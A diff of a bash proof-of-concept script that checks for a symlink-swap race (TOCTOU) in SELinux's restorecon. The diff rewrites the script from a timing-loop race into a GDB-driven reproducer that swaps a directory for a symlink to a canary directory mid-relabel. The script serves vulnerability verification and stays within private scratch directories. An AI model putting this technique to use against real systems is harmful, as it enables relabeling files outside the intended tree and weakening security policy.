@@ -4,78 +4,102 @@
 # restorecon allows relabeling of files outside the intended directory tree
 # via symlink swapping.
 #
-# Races a background thread that repeatedly replaces a directory component
-# ($WORKDIR/A/B) inside a tree being relabeled with a symlink pointing at a
-# canary directory *outside* the tree, against a foreground loop that runs
-# `restorecon -R` on the tree. If restorecon ever relabels the canary file
-# through the raced symlink, the context of the canary file changes and the
-# TOCTOU is confirmed.
+# This is a deterministic, GDB-driven reproducer rather than a pure timing
+# race. A plain race (background loop swapping a directory component while
+# `restorecon -R` runs in a loop) did not reliably land within thousands of
+# iterations even against genuinely vulnerable code - consistent with the
+# report's own AC:H ("high attack complexity") rating, since the actual
+# window is the gap between one internal libselinux call reading a file's
+# current context and a later one writing its new context, which is far
+# too narrow to hit by chance from an external, unsynchronized process.
 #
-# Must be run as root on an SELinux-enabled system. Only touches files under
-# a private, randomly-named directory in /var/tmp.
+# To remove the timing uncertainty, this script runs `restorecon -R` under
+# GDB, sets a breakpoint on the read side of that gap, and performs the
+# symlink swap synchronously the instant it is hit - reproducing the flaw
+# on every run if it exists, independent of scheduler luck.
+#
+# Must be run as root on an SELinux-enabled system with gdb installed. Only
+# touches files under private, randomly-named directories in /root.
+#
+# NOTE: the work and canary directories must live under a path prefix that
+# file_contexts actually has a spec for (e.g. /root, matched by
+# "/root(/.*)?"), otherwise restorecon has no default label to apply and
+# silently skips relabeling everything, which would make this reproducer
+# report "not vulnerable" for the wrong reason. /var/tmp/<random> does NOT
+# have such a spec on a default targeted policy - only the literal /var/tmp
+# path does - so it must not be used here.
+#
+# NOTE: the canary's file must be named exactly like the file under
+# $WORKDIR/A/B ("file"), since the exploit relies on the pathname suffix
+# "A/B/file" transparently resolving through the raced intermediate symlink
+# to $CANARY/file - an intermediate path component is always followed by
+# the kernel during path resolution, unlike the final component that l*()
+# calls refuse to follow.
 set -u
 
-ITER=${ITER:-500}
-
-WORKDIR=$(mktemp -d /var/tmp/toctou_test.XXXXXX)
-CANARY=$(mktemp -d /var/tmp/toctou_canary.XXXXXX)
-SWAP_PID=""
+WORKDIR=$(mktemp -d /root/toctou_test.XXXXXX)
+CANARY=$(mktemp -d /root/toctou_canary.XXXXXX)
+GDBSCRIPT=$(mktemp /root/toctou_XXXXXX.gdb)
+GDBLOG=$(mktemp /root/toctou_XXXXXX.log)
 
 cleanup() {
-	[ -n "$SWAP_PID" ] && kill "$SWAP_PID" 2>/dev/null
-	[ -n "$SWAP_PID" ] && wait "$SWAP_PID" 2>/dev/null
 	rm -f "$WORKDIR/A/B" 2>/dev/null
-	rm -rf "$WORKDIR" "$CANARY"
+	[ -d "$WORKDIR/A/B.bak" ] && mv "$WORKDIR/A/B.bak" "$WORKDIR/A/B"
+	rm -rf "$WORKDIR" "$CANARY" "$GDBSCRIPT" "$GDBLOG"
 }
 trap cleanup EXIT
 
-# Canary file lives outside the tree passed to restorecon. If it ever gets
-# relabeled, restorecon reached it through the raced symlink swap.
-echo canary > "$CANARY/canary_file"
-chcon -t httpd_sys_content_t "$CANARY/canary_file" >/dev/null 2>&1
-ORIG_CTX=$(stat -c %C "$CANARY/canary_file")
+echo canary > "$CANARY/file"
+chcon -t httpd_sys_content_t "$CANARY/file" >/dev/null 2>&1
+ORIG_CTX=$(stat -c %C "$CANARY/file")
 
-# Tree to be relabeled. Deliberately mislabel it so restorecon always has
-# something to fix on every path component during each iteration.
 mkdir -p "$WORKDIR/A/B"
 echo data > "$WORKDIR/A/B/file"
 chcon -R -t httpd_sys_content_t "$WORKDIR" >/dev/null 2>&1
 
-# Background swapper: replace $WORKDIR/A/B with a symlink to $CANARY and
-# then restore it, in a tight loop, racing restorecon's tree walk.
-(
-	while true; do
-		mv "$WORKDIR/A/B" "$WORKDIR/A/B.bak" 2>/dev/null
-		ln -s "$CANARY" "$WORKDIR/A/B" 2>/dev/null
-		rm -f "$WORKDIR/A/B" 2>/dev/null
-		mv "$WORKDIR/A/B.bak" "$WORKDIR/A/B" 2>/dev/null
-	done
-) &
-SWAP_PID=$!
+TARGET="$WORKDIR/A/B/file"
 
-for i in $(seq 1 "$ITER"); do
-	# Re-mislabel before every pass so restorecon always has a real
-	# label change (a set, not just a get) to perform on every node,
-	# keeping the TOCTOU window open on every iteration instead of only
-	# the first one. -h avoids dereferencing symlinks so this never
-	# touches the canary directory's contents even if B is currently
-	# swapped to point at it.
-	chcon -h -R -t httpd_sys_content_t "$WORKDIR" >/dev/null 2>&1
-	restorecon -R "$WORKDIR" >/dev/null 2>&1
-done
+# lgetfilecon_raw() is the read side of the get-current-context /
+# set-new-context pair in the pre-fix restorecon_sb() implementation. Stop
+# only on the invocation for our target path (skipping the other paths
+# visited first: $WORKDIR, $WORKDIR/A, $WORKDIR/A/B), then swap A/B for a
+# symlink to $CANARY before letting restorecon continue - so the *later*
+# write call in the same pair (lsetfilecon(), matched by the same pathname
+# string) resolves through the swapped component instead.
+#
+# On a fixed libselinux this breakpoint is simply never hit: the rewritten
+# implementation pins each entry via an O_PATH fd opened once during the
+# walk and never calls lgetfilecon_raw()/lsetfilecon() by path again, so
+# there is nothing for this script to break on and restorecon just runs to
+# completion.
+cat > "$GDBSCRIPT" <<EOF
+set pagination off
+set breakpoint pending on
+break lgetfilecon_raw
+run
+while !\$_streq((char*)\$rdi, "$TARGET")
+  continue
+end
+shell mv '$WORKDIR/A/B' '$WORKDIR/A/B.bak'
+shell ln -s '$CANARY' '$WORKDIR/A/B'
+continue
+EOF
 
-kill "$SWAP_PID" 2>/dev/null
-wait "$SWAP_PID" 2>/dev/null
-SWAP_PID=""
+# Guard against a runaway loop (e.g. a typo'd condition) hanging forever.
+timeout 30 gdb -q -batch -x "$GDBSCRIPT" --args restorecon -R "$WORKDIR" \
+	>"$GDBLOG" 2>&1
+GDB_RC=$?
 
-# Leave the tree in a sane state before checking the result.
 rm -f "$WORKDIR/A/B" 2>/dev/null
 [ -d "$WORKDIR/A/B.bak" ] && mv "$WORKDIR/A/B.bak" "$WORKDIR/A/B"
 
-NEW_CTX=$(stat -c %C "$CANARY/canary_file")
+NEW_CTX=$(stat -c %C "$CANARY/file")
 
+echo "gdb exit code: $GDB_RC (124 = timed out and was killed - see log below)"
 echo "canary context before: $ORIG_CTX"
 echo "canary context after:  $NEW_CTX"
+echo "--- gdb log ---"
+cat "$GDBLOG"
 
 if [ "$ORIG_CTX" != "$NEW_CTX" ]; then
 	echo "VULNERABLE: canary file outside the relabeled tree was modified (RHEL-217629)"
